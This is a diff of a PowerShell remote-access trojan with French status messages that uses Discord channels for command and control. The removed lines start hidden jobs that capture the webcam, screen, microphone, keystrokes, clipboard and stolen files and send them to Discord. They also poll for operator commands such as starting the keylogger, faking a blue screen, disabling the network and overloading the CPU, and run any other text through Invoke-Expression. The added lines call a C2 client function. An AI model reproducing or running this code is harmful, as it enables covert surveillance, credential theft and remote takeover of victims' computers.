-    $global:KeyID = New-Channel -name 'capture-touches'
-    $global:LootID = New-Channel -name 'fichiers-loot'
-    $global:PowershellID = New-Channel -name 'powershell'
-}
-Get-FFmpeg
-if ($InfoOnConnect -eq 1) { Get-QuickInfo }
-if ($defaultstart -eq 1) {
-    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
-    Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
-    Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID
-    Start-Job -ScriptBlock ${function:Start-Keylogger} -Name Keys -ArgumentList $global:KeyID
-    Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
-    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
-    Start-Job -ScriptBlock ${function:Monitor-Processes} -Name ProcessMonitor -ArgumentList $global:LootID
-    Start-Job -ScriptBlock ${function:Capture-Clipboard} -Name Clipboard -ArgumentList $global:LootID
-}
-Send-Message -Message ":white_check_mark: ``$env:COMPUTERNAME Configuration terminée !`` :white_check_mark:"
-
-# Boucle de traitement des commandes
-$lastMessageId = $null
-while ($true) {
-    $wc = Get-WebClient
-    $messages = ($wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json)[0]
-    if ($messages.author.id -ne (Get-BotUserId) -and $messages.timestamp -ne $lastMessageId) {
-        $lastMessageId = $messages.timestamp
-        $command = $messages.content.ToLower()
-        switch -Regex ($command) {
-            "^ping\s*(\S*)$" {
-                $target = if ($matches[1]) { $matches[1] } else { "8.8.8.8" }
-                Run-Ping -Target $target
-            }
-            "monitorprocesses" {
-                if (-not (Get-Job -Name ProcessMonitor -ErrorAction SilentlyContinue)) {
-                    Start-Job -ScriptBlock ${function:Monitor-Processes} -Name ProcessMonitor -ArgumentList $global:LootID
-                    Send-Message -Message ":mag_right: ``Surveillance des processus démarrée !`` :mag_right:"
-                } else {
-                    Send-Message -Message ":no_entry: ``Surveillance des processus déjà en cours !`` :no_entry:"
-                }
-            }
-            "captureclipboard" {
-                if (-not (Get-Job -Name Clipboard -ErrorAction SilentlyContinue)) {
-                    Start-Job -ScriptBlock ${function:Capture-Clipboard} -Name Clipboard -ArgumentList $global:LootID
-                    Send-Message -Message ":clipboard: ``Capture du presse-papiers démarrée !`` :clipboard:"
-                } else {
-                    Send-Message -Message ":no_entry: ``Capture du presse-papiers déjà en cours !`` :no_entry:"
-                }
-            }
-            "startkeylogger" {
-                if (-not (Get-Job -Name Keys -ErrorAction SilentlyContinue)) {
-                    Start-Job -ScriptBlock ${function:Start-Keylogger} -Name Keys -ArgumentList $global:KeyID
-                    Send-Message -Message ":keyboard: ``Keylogger démarré !`` :keyboard:"
-                } else {
-                    Send-Message -Message ":no_entry: ``Keylogger déjà en cours !`` :no_entry:"
-                }
-            }
-            "floodnotifications" { Flood-Notifications }
-            "simulatebsod" { Simulate-BSOD }
-            "disablenetwork" { Disable-Network }
-            "enablenetwork" { Enable-Network }
-            "rotatescreen" { Rotate-Screen }
-            "overloadcpu" { Overload-CPU }
-            "invertcolors" { Invert-Colors }
-            "options" { Options }
-            "close" {
-                Send-Message -Embed @{
-                    username = $env:COMPUTERNAME
-                    embeds = @(@{
-                        title = ":no_entry: $env:COMPUTERNAME | Session Fermée"
-                        description = ":no_entry: **$env:COMPUTERNAME** ferme la session."
-                        color = 0xFF0000
-                        footer = @{ text = $timestamp }
-                    })
-                }
-                exit
-            }
-            default {
-                try {
-                    $output = Invoke-Expression $command -ErrorAction Stop
-                    Send-Message -Message "``````$output``````"
-                } catch {
-                    Send-Message -Message ":warning: ``Erreur : $_`` :warning:"
-                }
-            }
-        }
-    }
-    Start-Sleep -Seconds 3
-}
+# Start the client
+Start-C2Client
